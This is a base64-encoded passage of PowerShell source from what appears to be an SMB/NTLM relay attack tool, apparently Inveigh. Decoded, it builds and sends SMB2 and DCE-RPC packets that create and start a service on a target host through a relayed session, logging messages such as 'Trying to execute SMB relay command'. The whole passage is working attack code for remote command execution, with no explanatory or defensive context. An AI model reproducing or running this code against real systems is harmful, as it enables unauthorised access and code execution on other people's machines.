RGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBpcyBub3QgYSBsb2NhbCBhZG1pbmlzdHJhdG9yIG9yIGRvZXMgbm90IGhhdmUgcmVxdWlyZWQgcHJpdmlsZWdlIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9mYWlsZWQgPSAkdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICdDcmVhdGVTZXJ2aWNlVycKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCArPSAyMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlciA9IEdldC1QYWNrZXRTTUIySGVhZGVyIDB4MDksMHgwMCAkU01CMl9tZXNzYWdlX0lEICRTTUIyX3RyZWVfSUQgJFNNQl9zZXNzaW9uX0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyWyJTTUIySGVhZGVyX0NyZWRpdFJlcXVlc3QiXSA9IDB4N2YsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9SUENfZGF0YSA9IEdldC1QYWNrZXRSUENSZXF1ZXN0IDB4MDMgJFNDTV9kYXRhLkxlbmd0aCAwIDAgMHgwMiwweDAwLDB4MDAsMHgwMCAweDAwLDB4MDAgMHgwYywweDAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyV3JpdGVSZXF1ZXN0ICRTTUJfZmlsZV9JRCAoJFJQQ19kYXRhLkxlbmd0aCArICRTQ01fZGF0YS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQjJfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoICsgJFJQQ19kYXRhLkxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IEdldC1QYWNrZXROZXRCSU9TU2Vzc2lvblNlcnZpY2UgJFNNQjJfaGVhZGVyLkxlbmd0aCAkUlBDX2RhdGFfbGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQjJfaGVhZGVyICsgJFNNQjJfZGF0YSArICRSUENfZGF0YSArICRTQ01fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLldyaXRlKCRTTUJfY2xpZW50X3NlbmQsMCwkU01CX2NsaWVudF9zZW5kLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uUmVhZCgkU01CX2NsaWVudF9yZWNlaXZlLDAsJFNNQl9jbGllbnRfcmVjZWl2ZS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdSZWFkUmVxdWVzdCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlX25leHQgPSAnU3RhcnRTZXJ2aWNlVycgIAogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAnQ3JlYXRlU2VydmljZVdfRmlyc3QnCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc3BsaXRfc3RhZ2VfZmluYWwgPSBbTWF0aF06OkNlaWxpbmcoJFNDTV9kYXRhLkxlbmd0aCAvICRTTUJfc3BsaXRfaW5kZXgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEICs9IDIwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU0NNX2RhdGFfZmlyc3QgPSAkU0NNX2RhdGFbMC4uKCRTTUJfc3BsaXRfaW5kZXggLSAxKV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAxIDAgMCAwIDB4MDIsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MGMsMHgwMCAkU0NNX2RhdGFfZmlyc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGFbIlJQQ1JlcXVlc3RfQWxsb2NIaW50Il0gPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRTQ01fZGF0YS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NwbGl0X2luZGV4X3RyYWNrZXIgPSAkU01CX3NwbGl0X2luZGV4CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1JQQ19kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfaGVhZGVyID0gR2V0LVBhY2tldFNNQjJIZWFkZXIgMHgwOSwweDAwICRTTUIyX21lc3NhZ2VfSUQgJFNNQjJfdHJlZV9JRCAkU01CX3Nlc3Npb25fSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXJbIlNNQjJIZWFkZXJfQ3JlZGl0UmVxdWVzdCJdID0gMHg3ZiwweDAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NNQjJfZGF0YSA9IEdldC1QYWNrZXRTTUIyV3JpdGVSZXF1ZXN0ICRTTUJfZmlsZV9JRCAkUlBDX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9oZWFkZXIgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfaGVhZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUlBDX2RhdGFfbGVuZ3RoID0gJFNNQjJfZGF0YS5MZW5ndGggKyAkUlBDX2RhdGEuTGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3NlbmQgPSAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgKyAkU01CMl9oZWFkZXIgKyAkU01CMl9kYXRhICsgJFJQQ19kYXRhCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5SZWFkKCRTTUJfY2xpZW50X3JlY2VpdmUsMCwkU01CX2NsaWVudF9yZWNlaXZlLkxlbmd0aCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNNQl9zcGxpdF9zdGFnZV9maW5hbCAtbGUgMikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdDcmVhdGVTZXJ2aWNlV19MYXN0JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfc3BsaXRfc3RhZ2UgPSAyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ3JlYXRlU2VydmljZVdfTWlkZGxlJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJ0NyZWF0ZVNlcnZpY2VXX01pZGRsZScKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zcGxpdF9zdGFnZSsrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEKysKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTQ01fZGF0YV9taWRkbGUgPSAkU0NNX2RhdGFbJFNNQl9zcGxpdF9pbmRleF90cmFja2VyLi4oJFNNQl9zcGxpdF9pbmRleF90cmFja2VyICsgJFNNQl9zcGxpdF9pbmRleCAtIDEpXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zcGxpdF9pbmRleF90cmFja2VyICs9ICRTTUJfc3BsaXRfaW5kZXgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAwIDAgMCAwIDB4MDIsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MGMsMHgwMCAkU0NNX2RhdGFfbWlkZGxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1JQQ19kYXRhWyJSUENSZXF1ZXN0X0FsbG9jSGludCJdID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkU0NNX2RhdGEuTGVuZ3RoIC0gJFNNQl9zcGxpdF9pbmRleF90cmFja2VyICsgJFNNQl9zcGxpdF9pbmRleCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDA5LDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJXcml0ZVJlcXVlc3QgJFNNQl9maWxlX0lEICRSUENfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfZGF0YSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YV9sZW5ndGggPSAkU01CMl9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFJQQ19kYXRhX2xlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTTUJfc3BsaXRfc3RhZ2UgLWdlICRTTUJfc3BsaXRfc3RhZ2VfZmluYWwpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnQ3JlYXRlU2VydmljZVdfTGFzdCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZSA9ICdDcmVhdGVTZXJ2aWNlV19NaWRkbGUnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAnQ3JlYXRlU2VydmljZVdfTGFzdCcKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQjJfbWVzc2FnZV9JRCsrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU0NNX2RhdGFfbGFzdCA9ICRTQ01fZGF0YVskU01CX3NwbGl0X2luZGV4X3RyYWNrZXIuLiRTQ01fZGF0YS5MZW5ndGhdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1JQQ19kYXRhID0gR2V0LVBhY2tldFJQQ1JlcXVlc3QgMHgwMiAwIDAgMCAweDAyLDB4MDAsMHgwMCwweDAwIDB4MDAsMHgwMCAweDBjLDB4MDAgJFNDTV9kYXRhX2xhc3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9oZWFkZXIgPSBHZXQtUGFja2V0U01CMkhlYWRlciAweDA5LDB4MDAgJFNNQjJfbWVzc2FnZV9JRCAkU01CMl90cmVlX0lEICRTTUJfc2Vzc2lvbl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfU01CMl9kYXRhID0gR2V0LVBhY2tldFNNQjJXcml0ZVJlcXVlc3QgJFNNQl9maWxlX0lEICRSUENfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2RhdGEgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X1NNQjJfZGF0YSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YV9sZW5ndGggPSAkU01CMl9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBHZXQtUGFja2V0TmV0QklPU1Nlc3Npb25TZXJ2aWNlICRTTUIyX2hlYWRlci5MZW5ndGggJFJQQ19kYXRhX2xlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9OZXRCSU9TX3Nlc3Npb25fc2VydmljZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5Xcml0ZSgkU01CX2NsaWVudF9zZW5kLDAsJFNNQl9jbGllbnRfc2VuZC5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uRmx1c2goKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RhZ2UgPSAnUmVhZFJlcXVlc3QnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdGFnZV9uZXh0ID0gJ1N0YXJ0U2VydmljZVcnCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICdTdGFydFNlcnZpY2VXJwogICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzEzMi4uMTM1XSkgLWVxICcwMC0wMC0wMC0wMCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBjcmVhdGVkIG9uICRUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gVHJ5aW5nIHRvIGV4ZWN1dGUgU01CIHJlbGF5IGNvbW1hbmQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBUcnlpbmcgdG8gZXhlY3V0ZSBTTUIgcmVsYXkgY29tbWFuZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTTUIgcmVsYXkgc2VydmljZSAkU01CX3NlcnZpY2UgY3JlYXRlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiVHJ5aW5nIHRvIGV4ZWN1dGUgU01CIHJlbGF5IGNvbW1hbmQgb24gJFRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXJ2aWNlX2NvbnRleHRfaGFuZGxlID0gJFNNQl9jbGllbnRfcmVjZWl2ZVsxMTIuLjEzMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9tZXNzYWdlX0lEICs9IDIwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlciA9IEdldC1QYWNrZXRTTUIySGVhZGVyIDB4MDksMHgwMCAkU01CMl9tZXNzYWdlX0lEICRTTUIyX3RyZWVfSUQgJFNNQl9zZXNzaW9uX0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2hlYWRlclsiU01CMkhlYWRlcl9DcmVkaXRSZXF1ZXN0Il0gPSAweDdmLDB4MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X1NDTV9kYXRhID0gR2V0LVBhY2tldFNDTVN0YXJ0U2VydmljZVcgJFNNQl9zZXJ2aWNlX2NvbnRleHRfaGFuZGxlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNDTV9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TQ01fZGF0YQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWNrZXRfUlBDX2RhdGEgPSBHZXQtUGFja2V0UlBDUmVxdWVzdCAweDAzICRTQ01fZGF0YS5MZW5ndGggMCAwIDB4MDMsMHgwMCwweDAwLDB4MDAgMHgwMCwweDAwIDB4MTMsMHgwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSUENfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfUlBDX2RhdGEgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhY2tldF9TTUIyX2RhdGEgPSBHZXQtUGFja2V0U01CMldyaXRlUmVxdWVzdCAkU01CX2ZpbGVfSUQgKCRSUENfZGF0YS5MZW5ndGggKyAkU0NNX2RhdGEuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUIyX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CMl9oZWFkZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CMl9kYXRhID0gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkgJHBhY2tldF9TTUIyX2RhdGEgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJQQ19kYXRhX2xlbmd0aCA9ICRTTUIyX2RhdGEuTGVuZ3RoICsgJFNDTV9kYXRhLkxlbmd0aCArICRSUENfZGF0YS5MZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CMl9oZWFkZXIuTGVuZ3RoICRSUENfZGF0YV9sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmV0QklPU19zZXNzaW9uX3NlcnZpY2UgPSBDb252ZXJ0RnJvbS1QYWNrZXRPcmRlcmVkRGljdGlvbmFyeSAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc2VuZCA9ICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSArICRTTUIyX2hlYWRlciArICRTTUIyX2RhdGEgKyAkUlBDX2RhdGEgKyAkU0NNX2RhdGEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0cmVhbS5GbHVzaCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ1JlYWRSZXF1ZXN0JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlX25leHQgPSAnRGVsZXRlU2VydmljZVcnICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbMTMyLi4xMzVdKSAtZXEgJzMxLTA0LTAwLTAwJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiU01CIHJlbGF5IHNlcnZpY2UgJFNNQl9zZXJ2aWNlIGNyZWF0aW9uIGZhaWxlZCBvbiAkVGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X2ZhaWxlZCA9ICR0cnVlCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBzZXJ2aWNlICRTTUJfc2VydmljZSBjcmVhdGlvbiBmYWlsZWQgb24gJFRhcmdldCIp